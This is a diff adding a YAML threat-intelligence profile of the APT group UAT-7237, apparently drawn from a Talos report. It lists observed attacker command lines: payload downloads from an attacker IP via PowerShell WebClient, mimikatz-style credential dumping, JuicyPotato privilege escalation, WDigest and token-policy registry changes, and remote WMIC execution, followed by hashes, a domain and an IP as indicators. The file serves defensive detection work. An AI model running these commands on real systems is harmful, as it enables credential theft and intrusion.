@@ -1,0 +1,107 @@
+description: UAT-7237, a Chinese-speaking APT group active since 2022, targets web
+  infrastructure entities in Taiwan using open-source and customized tools for long-term
+  persistence.
+attribution:
+- UAT-7237 (Chinese-speaking APT)
+malware_families:
+- SoundBill
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  - c:\\temp\\WM7Lite\\download.exe
+  - C:\\Windows\\Temp\\vmware-SYSTEM\\vmtools.exe
+  - C:\\ProgramData\\dynatrace\\sharpwmi.exe
+  - WMIcmd.exe
+  - VTSB.exe
+  - c:\\hotfix\\juicy2.exe
+  - mmc comexp.msc
+  - C:\\hotfix\\invoketest.exe
+  - Project1.exe
+  - c:\\program files\\7-Zip\\7z.exe
+  commandline:
+  - cmd /c nslookup <victims_domain>
+  - cmd /c systeminfo
+  - cmd /c curl
+  - cmd /c ping 8.8.8.8
+  - cmd /c ping 141.164.50.141 // Attacker controlled remote server.
+  - cmd /c ping <victims_domain>
+  - cmd /c ipconfig /all
+  - cmd /c c:\\temp\\WM7Lite\\download.exe hxxp://141.164.50.141/sdksdk608/win-x64.rar
+    c:\\temp\\WM7Lite\\1.rar
+  - powershell (new-object System.Net.WebClient).DownloadFile('hxxp://141.164.50.141/sdksdk608/vpn.rar','C:\\Windows\\Temp\\vmware-SYSTEM\\vmtools.rar')
+  - cmd.exe /c cd /d "<remote_smb_share>"&net use
+  - cmd.exe /c cd /d "<remote_smb_share>"&dir \\\\<remote_smb_share>\\c$\\
+  - cmd.exe /c cd /d "C:\\"&net group "domain admins" /domain
+  - cmd.exe /c cd /d "C:\\"&net group "domain controllers" /domain
+  - cmd.exe /c cd /d "C:\\"&C:\\ProgramData\\dynatrace\\sharpwmi.exe <IP> <user> <pass>
+  - cmd whoami
+  - wmic /node:<IP> /user:Administrator /password:<pass> process call create cmd.exe
+    /c whoami
+  - wmic /node:<IP> /user:Administrator /password:<pass> process call create cmd.exe
+    /c netstat -ano >c:\\1.txt
+  - cmd.exe /c systeminfo
+  - cmd.exe /c tasklist
+  - cmd.exe /c net user /domain
+  - cmd.exe /c whoami /priv
+  - cmd.exe /c quser
+  - VTSB.exe privilege::debug sekurlsa::logonpasswords exit
+  - c:\\temp\\vtsb.exe -c whoami
+  - cmd.exe /c c:\\hotfix\\juicy2.exe -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9}
+    -p whoami
+  - reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system /v
+    LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+  - reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v
+    UseLogonCredential /t REG_DWORD /d 1 /f
+  - mmc comexp.msc
+  - cmd.exe /c C:\\hotfix\\invoketest.exe -cmd "cmd /c C:\\hotfix\\1.bat"
+  - cmd.exe /c C:\\hotfix\\invoketest.exe -cmd "cmd /c C:\\hotfix\\Project1.exe C:\\hotfix\\SSP.dll"
+  - cmd.exe /c c:\\hotfix\\juicy2.exe -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
+    -p "c:\\windows\\system32\\cmd.exe" -a "/c c:\\hotfix\\1.bat"
+  - cmd.exe /c "c:\\program files\\7-Zip\\7z.exe" a C:\\hotfix\\1.zip C:\\hotfix\\1.bin
+  powershell:
+  - (new-object System.Net.WebClient).DownloadFile('hxxp://141.164.50.141/sdksdk608/vpn.rar','C:\\Windows\\Temp\\vmware-SYSTEM\\vmtools.rar')
+  scripting_engine: []
+  registry_keys:
+  - HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system
+  - HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest
+  image_load: []
+  network_connections:
+  - cmd.exe hxxp://141.164.50.141/sdksdk608/win-x64.rar
+  - powershell.exe hxxp://141.164.50.141/sdksdk608/vpn.rar
+  file_activity:
+  - C:\\temp\\WM7Lite\\download.exe
+  - c:\\temp\\WM7Lite\\1.rar
+  - C:\\Windows\\Temp\\vmware-SYSTEM\\vmtools.rar
+  - C:\\ProgramData\\dynatrace\\sharpwmi.exe
+  - WMIcmd.exe
+  - VTSB.exe
+  - c:\\hotfix\\juicy2.exe
+  - mmc comexp.msc
+  - C:\\hotfix\\invoketest.exe
+  - Project1.exe
+  - c:\\program files\\7-Zip\\7z.exe
+  persistence:
+  - SoftEther VPN client
+  pipes: []
+  process_relations: []
+IOCs:
+  hashes:
+  - 450fa9029c59af9edf2126df1d6a657ee6eb024d0341b32e6f6bdb8dc04bae5a
+  - 6a72e4b92d6a459fc2c6054e9ddb9819d04ed362bd847333492410b6d7bae5aa
+  - E106716a660c751e37cfc4f4fbf2ea2f833e92c2a49a0b3f40fc36ad77e0a044
+  - B52bf5a644ae96807e6d846b0ce203611d83cc8a782badc68ac46c9616649477
+  - 864e67f76ad0ce6d4cc83304af4347384c364ca6735df0797e4b1ff9519689c5
+  - Df8497b9c37b780d6b6904a24133131faed8ea4cf3d75830b53c25d41c5ea386
+  - 0952e5409f39824b8a630881d585030a1d656db897adf228ce27dd9243db20b7
+  domains:
+  - cvbbonwxtgvc3isfqfc52cwzja0kvuqd.lambda-url.ap-northeast-1.on.aws
+  IPs:
+  - 141.164.50.141
+authors:
+- Asheer Malhotra
+- Brandon White
+- Vitor Ventura
+reference: https://blog.talosintelligence.com/uat-7237-targets-web-hosting-infra/
+date_of_publication: August 15, 2025
+file_creation_date: August 17, 2025
